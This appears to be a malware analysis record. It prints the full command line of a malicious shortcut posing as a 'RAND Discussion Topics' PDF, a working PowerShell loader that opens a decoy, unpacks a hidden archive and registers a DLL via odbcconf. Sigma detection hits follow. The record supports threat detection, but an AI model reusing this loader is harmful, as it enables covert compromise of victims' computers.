lnk_info.command_line_arguments: conhost --headless cmd /c FOR /F "delims=s\ tokens=4" %f IN ('set^|findstr PSM')DO %f -w 1 $zf='ssf.zip';$pd='RAND Discussion Topics.pdf';$pdl='RAND Discussion Topics.lnk';$E=$ENV:Temp;$F=$env:LocalAppData+'\PDFs';if(-not(Test-Path $pdl)){cd $E;$pdl=(dir -recurse *$pdl)[0].fullname;$pd=$E+'\'+[System.IO.Path]::GetFileNameWithoutExtension($pdl)+'.pdf'}$b=[IO.File]::ReadAllBytes($pdl);function f($ar,$su){foreach($i in 0..($ar.Length-$su.Length)){$fo=$true;foreach($j in 0..($su.Length-1)){if($ar[$i+$j] -ne $su[$j]){$fo=$false;break;}}if($fo){return $i;}}return -1;}$i=f $b ([byte[]][char[]]'%PDF');$nb=$b[$i..$b.Length];$s=[System.IO.FileStream]::new($pd,[System.IO.FileMode]::Create);$s.Write($nb,0,($nb.length));$s.close();start $pd;Remove-Item $pdl;mkdir $F -f;copy $pd $F\$zf;Expand-Archive $F\$zf $F\ -f;cd $F;Start-Sleep -Seconds 3;rm $zf;odbcconf /a `{regsvr "$F\sst" `} ;

sigma_analysis_results.rule_title: Potentially Suspicious DLL Registered Via Odbcconf.EXE
sigma_analysis_results.rule_description: Detects execution of "odbcconf" with the "REGSVR" action where the DLL in question doesn't contain a ".dll" extension. Which is often used as a method to evade defenses.

sigma_analysis_results.rule_title: Suspicious Copy From or To System Directory
sigma_analysis_results.rule_description:
Detects a suspicious copy operation that tries to copy a program from system (System32, SysWOW64, WinSxS) directories to another on disk.
Often used to move LOLBINs such as 'certutil' or 'desktopimgdownldr' to a different location with a different name in order to bypass detections based on locations.
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Markus Neis, Tim Shelton (HAWK.IO), Nasreddine Bencherchali (Nextron Systems)

sigma_analysis_results.rule_title: File And SubFolder Enumeration Via Dir Command
sigma_analysis_results.rule_description: Detects usage of the "dir" command part of Widows CMD with the "/S" command line flag in order to enumerate files in a specified directory and all subdirectories.
